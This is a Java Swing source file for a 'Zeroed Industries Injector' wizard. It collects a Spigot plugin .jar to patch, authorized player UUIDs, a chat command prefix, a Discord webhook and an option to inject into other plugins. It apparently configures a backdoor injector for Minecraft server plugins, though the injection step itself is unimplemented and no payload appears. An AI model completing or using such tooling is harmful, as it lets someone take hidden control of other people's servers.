package com.zeroedindustries.debugger;

import com.formdev.flatlaf.FlatIntelliJLaf;
import javax.swing.*;
import javax.swing.border.EmptyBorder;
import javax.swing.filechooser.FileFilter;
import javax.swing.plaf.nimbus.NimbusLookAndFeel;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.io.File;
import java.util.Locale;
import java.util.LinkedHashMap;
import java.util.Map;

public class InjectorGUI extends JDialog {
    private CardLayout cardLayout;
    private JPanel cardPanel;

    private JButton backButton;
    private JButton nextButton;
    private JButton cancelButton;

    private JComboBox<String> lafSelector;

    // Map of LAF display names to fully qualified class names
    private final Map<String, String> lookAndFeels = new LinkedHashMap<>();

    // Wizard pages
    private File selectedJarFile;
    private String minecraftUUIDs;
    private boolean useUsernames;
    private String chatPrefix;
    private String discordWebhook;
    private boolean injectOther;
    private boolean warnings;

    // Current step index
    private int step = 0;

    public InjectorGUI(Frame owner) {
        super(owner, "Zeroed Industries Injector Wizard", true);

        // Setup the configurable LAF map here:
        lookAndFeels.put("Nimbus", "javax.swing.plaf.nimbus.NimbusLookAndFeel");
        lookAndFeels.put("Flat IntelliJ", "com.formdev.flatlaf.FlatIntelliJLaf");
        lookAndFeels.put("System", UIManager.getSystemLookAndFeelClassName());

        initComponents();
        setDefaultCloseOperation(DISPOSE_ON_CLOSE);
        setSize(600, 400);
        setLocationRelativeTo(owner);
        updateButtons();
    }
    public static void displayError(String message){
        JOptionPane.showMessageDialog(null, message, "Zeroed Industries", JOptionPane.ERROR_MESSAGE);
    }
    private void initComponents() {
        cardLayout = new CardLayout();
        cardPanel = new JPanel(cardLayout);

        // Add wizard step panels
        cardPanel.add(createWelcomePanel(), "welcome");
        cardPanel.add(createFileChooserPanel(), "filechooser");
        cardPanel.add(createUUIDsPanel(), "uuids");
        cardPanel.add(createChatPrefixPanel(), "prefix");
        cardPanel.add(createDiscordPanel(), "discord");
        cardPanel.add(createOptionsPanel(), "options");
        cardPanel.add(createSummaryPanel(), "summary");

        // Buttons
        backButton = new JButton("Back");
        nextButton = new JButton("Next");
        cancelButton = new JButton("Cancel");

        backButton.addActionListener(this::onBack);
        nextButton.addActionListener(this::onNext);
        cancelButton.addActionListener(e -> dispose());

        // Create LAF selector dropdown dynamically from map keys
        lafSelector = new JComboBox<>(lookAndFeels.keySet().toArray(new String[0]));
        lafSelector.setSelectedItem("Nimbus");  // Default
        lafSelector.addActionListener(e -> onChangeLookAndFeel());

        // Button panel with LAF selector on left, buttons on right
        JPanel buttonPanel = new JPanel(new BorderLayout());
        buttonPanel.setBorder(new EmptyBorder(5, 10, 5, 10));

        JPanel lafPanel = new JPanel(new FlowLayout(FlowLayout.LEFT));
        lafPanel.add(new JLabel("Look & Feel: "));
        lafPanel.add(lafSelector);

        JPanel navPanel = new JPanel();
        navPanel.add(backButton);
        navPanel.add(nextButton);
        navPanel.add(cancelButton);

        buttonPanel.add(lafPanel, BorderLayout.WEST);
        buttonPanel.add(navPanel, BorderLayout.EAST);

        getContentPane().setLayout(new BorderLayout());
        getContentPane().add(cardPanel, BorderLayout.CENTER);
        getContentPane().add(buttonPanel, BorderLayout.SOUTH);

        // Set default LAF
        setLookAndFeel("Nimbus");
    }

    // Wizard steps as JPanels
    private JPanel createWelcomePanel() {
        JPanel p = new JPanel(new BorderLayout());
        JLabel label = new JLabel("<html><h2>Welcome to Zeroed Industries Injector</h2>" +
                "<p>This wizard will guide you through the injection process.</p></html>", SwingConstants.CENTER);
        p.add(label, BorderLayout.CENTER);
        return p;
    }

    private JPanel createFileChooserPanel() {
        JPanel p = new JPanel(new BorderLayout(10, 10));
        p.setBorder(new EmptyBorder(20, 20, 20, 20));

        JLabel label = new JLabel("Select Spigot plugin .jar file to patch:");
        JTextField filePathField = new JTextField();
        filePathField.setEditable(false);
        JButton browseBtn = new JButton("Browse...");

        browseBtn.addActionListener(e -> {
            JFileChooser fc = new JFileChooser();
            fc.setFileFilter(new FileFilter() {
                @Override
                public boolean accept(File f) {
                    return f.isDirectory() || f.getName().toLowerCase(Locale.ROOT).endsWith(".jar");
                }

                @Override
                public String getDescription() {
                    return "Spigot Plugin File (*.jar)";
                }
            });

            int result = fc.showOpenDialog(this);
            if (result == JFileChooser.APPROVE_OPTION) {
                selectedJarFile = fc.getSelectedFile();
                filePathField.setText(selectedJarFile.getAbsolutePath());
            }
        });

        JPanel topPanel = new JPanel(new BorderLayout(5, 5));
        topPanel.add(label, BorderLayout.NORTH);
        topPanel.add(filePathField, BorderLayout.CENTER);
        topPanel.add(browseBtn, BorderLayout.EAST);

        p.add(topPanel, BorderLayout.NORTH);

        return p;
    }

    private JPanel createUUIDsPanel() {
        JPanel p = new JPanel(new BorderLayout(10, 10));
        p.setBorder(new EmptyBorder(20, 20, 20, 20));

        JCheckBox offlineModeCheck = new JCheckBox("Use offline mode? (Usernames instead of UUIDs)");
        JTextArea uuidsArea = new JTextArea(5, 40);
        JScrollPane scrollPane = new JScrollPane(uuidsArea);
        JLabel label = new JLabel("Minecraft UUIDs/Usernames (comma separated, leave blank to disable authorization):");

        offlineModeCheck.addActionListener(e -> {
            useUsernames = offlineModeCheck.isSelected();
            label.setText("Minecraft " + (useUsernames ? "Usernames" : "UUIDs") +
                    " (comma separated, leave blank to disable authorization):");
        });

        p.add(offlineModeCheck, BorderLayout.NORTH);
        p.add(label, BorderLayout.CENTER);
        p.add(scrollPane, BorderLayout.SOUTH);

        // Save data on panel hide
        p.putClientProperty("offlineCheck", offlineModeCheck);
        p.putClientProperty("uuidTextArea", uuidsArea);

        return p;
    }

    private JPanel createChatPrefixPanel() {
        JPanel p = new JPanel(new BorderLayout(10, 10));
        p.setBorder(new EmptyBorder(20, 20, 20, 20));

        JLabel label = new JLabel("Chat Command Prefix:");
        JTextField prefixField = new JTextField("#");

        p.add(label, BorderLayout.NORTH);
        p.add(prefixField, BorderLayout.CENTER);

        p.putClientProperty("prefixField", prefixField);

        return p;
    }

    private JPanel createDiscordPanel() {
        JPanel p = new JPanel(new BorderLayout(10, 10));
        p.setBorder(new EmptyBorder(20, 20, 20, 20));

        JLabel label = new JLabel("Discord Webhook URL (leave blank to disable, recommended to disable):");
        JTextField discordField = new JTextField();

        p.add(label, BorderLayout.NORTH);
        p.add(discordField, BorderLayout.CENTER);

        p.putClientProperty("discordField", discordField);

        return p;
    }

    private JPanel createOptionsPanel() {
        JPanel p = new JPanel(new GridLayout(2, 1));
        p.setBorder(new EmptyBorder(20, 20, 20, 20));

        JCheckBox injectOtherCheck = new JCheckBox("Inject to other plugins? (Experimental, not working yet)");
        JCheckBox warningsCheck = new JCheckBox("Enable Debug Messages? (Use for GitHub issues)");

        p.add(injectOtherCheck);
        p.add(warningsCheck);

        p.putClientProperty("injectOtherCheck", injectOtherCheck);
        p.putClientProperty("warningsCheck", warningsCheck);

        return p;
    }

    private JPanel createSummaryPanel() {
        JPanel p = new JPanel(new BorderLayout(10, 10));
        p.setBorder(new EmptyBorder(20, 20, 20, 20));

        JTextArea summaryArea = new JTextArea();
        summaryArea.setEditable(false);
        summaryArea.setFont(new Font(Font.MONOSPACED, Font.PLAIN, 12));

        p.add(new JLabel("Summary:"), BorderLayout.NORTH);
        p.add(new JScrollPane(summaryArea), BorderLayout.CENTER);

        p.putClientProperty("summaryArea", summaryArea);

        return p;
    }

    // Button listeners and navigation

    private void onBack(ActionEvent e) {
        if (step > 0) {
            step--;
            cardLayout.previous(cardPanel);
            updateButtons();
        }
    }

    private void onNext(ActionEvent e) {
        if (!validateCurrentStep()) {
            return; // Don't proceed if validation failed
        }

        if (step < 6) {
            updateStepData(); // save data of current step before moving on
            step++;
            cardLayout.next(cardPanel);
            updateButtons();
            if (step == 6) {
                updateSummary();
            }
        } else {
            // Last step, start injection
            performInjection();
        }
    }

    private void updateButtons() {
        backButton.setEnabled(step > 0);
        nextButton.setText(step == 6 ? "Finish" : "Next");
    }

    private void updateStepData() {
        switch (step) {
            case 0: // Welcome step, nothing
                break;
            case 1: { // File chooser step
                // selectedJarFile updated by browse button listener
                break;
            }
            case 2: { // UUIDs step
                JPanel p = (JPanel) cardPanel.getComponent(2);
                JCheckBox offlineCheck = (JCheckBox) p.getClientProperty("offlineCheck");
                JTextArea uuidArea = (JTextArea) p.getClientProperty("uuidTextArea");

                useUsernames = offlineCheck.isSelected();
                minecraftUUIDs = uuidArea.getText().trim();
                break;
            }
            case 3: { // Chat prefix step
                JPanel p = (JPanel) cardPanel.getComponent(3);
                JTextField prefixField = (JTextField) p.getClientProperty("prefixField");
                chatPrefix = prefixField.getText().trim();
                break;
            }
            case 4: { // Discord webhook step
                JPanel p = (JPanel) cardPanel.getComponent(4);
                JTextField discordField = (JTextField) p.getClientProperty("discordField");
                discordWebhook = discordField.getText().trim();
                break;
            }
            case 5: { // Options step
                JPanel p = (JPanel) cardPanel.getComponent(5);
                JCheckBox injectOtherCheck = (JCheckBox) p.getClientProperty("injectOtherCheck");
                JCheckBox warningsCheck = (JCheckBox) p.getClientProperty("warningsCheck");

                injectOther = injectOtherCheck.isSelected();
                warnings = warningsCheck.isSelected();
                break;
            }
            case 6: // Summary step, no input
                break;
        }
    }

    private boolean validateCurrentStep() {
        switch (step) {
            case 1: // File chooser
                if (selectedJarFile == null || !selectedJarFile.exists()) {
                    JOptionPane.showMessageDialog(this, "Please select a valid .jar file to patch.", "Input Error", JOptionPane.ERROR_MESSAGE);
                    return false;
                }
                break;
            case 3: // Chat prefix
                JPanel p = (JPanel) cardPanel.getComponent(3);
                JTextField prefixField = (JTextField) p.getClientProperty("prefixField");
                if (prefixField.getText().trim().isEmpty()) {
                    JOptionPane.showMessageDialog(this, "Chat Command Prefix cannot be empty.", "Input Error", JOptionPane.ERROR_MESSAGE);
                    return false;
                }
                break;
        }
        return true;
    }

    private void updateSummary() {
        JPanel p = (JPanel) cardPanel.getComponent(6);
        JTextArea summaryArea = (JTextArea) p.getClientProperty("summaryArea");

        StringBuilder sb = new StringBuilder();
        sb.append("File to patch: ").append(selectedJarFile == null ? "None" : selectedJarFile.getAbsolutePath()).append("\n");
        sb.append("Offline mode (usernames): ").append(useUsernames).append("\n");
        sb.append("UUIDs/Usernames: ").append(minecraftUUIDs == null || minecraftUUIDs.isEmpty() ? "(none)" : minecraftUUIDs).append("\n");
        sb.append("Chat Command Prefix: ").append(chatPrefix).append("\n");
        sb.append("Discord Webhook: ").append(discordWebhook.isEmpty() ? "(none)" : discordWebhook).append("\n");
        sb.append("Inject to other plugins: ").append(injectOther).append("\n");
        sb.append("Enable Debug Messages: ").append(warnings).append("\n");

        summaryArea.setText(sb.toString());
    }

    private void performInjection() {
        JOptionPane.showMessageDialog(this, "Injection process would start now.\n(Not implemented yet)", "Info", JOptionPane.INFORMATION_MESSAGE);
        dispose();
    }

    private void onChangeLookAndFeel() {
        String selected = (String) lafSelector.getSelectedItem();
        if (selected != null) {
            setLookAndFeel(selected);
        }
    }

    private void setLookAndFeel(String name) {
        String lafClass = lookAndFeels.get(name);
        if (lafClass == null) {
            return;
        }

        try {
            // Special case for system LAF if class name is obtained dynamically
            if ("System".equals(name)) {
                lafClass = UIManager.getSystemLookAndFeelClassName();
            }
            UIManager.setLookAndFeel(lafClass);
            SwingUtilities.updateComponentTreeUI(this);
            pack();
        } catch (Exception e) {
            JOptionPane.showMessageDialog(this, "Failed to set Look & Feel: " + e.getMessage(),
                    "Error", JOptionPane.ERROR_MESSAGE);
        }
    }

    public static void main(String[] args) {
        // Set Nimbus as default LAF if available
        try {
            UIManager.setLookAndFeel("javax.swing.plaf.nimbus.NimbusLookAndFeel");
        } catch (Exception ignored) {}

        SwingUtilities.invokeLater(() -> {
            InjectorGUI wizard = new InjectorGUI(null);
            wizard.setVisible(true);
        });
    }
}
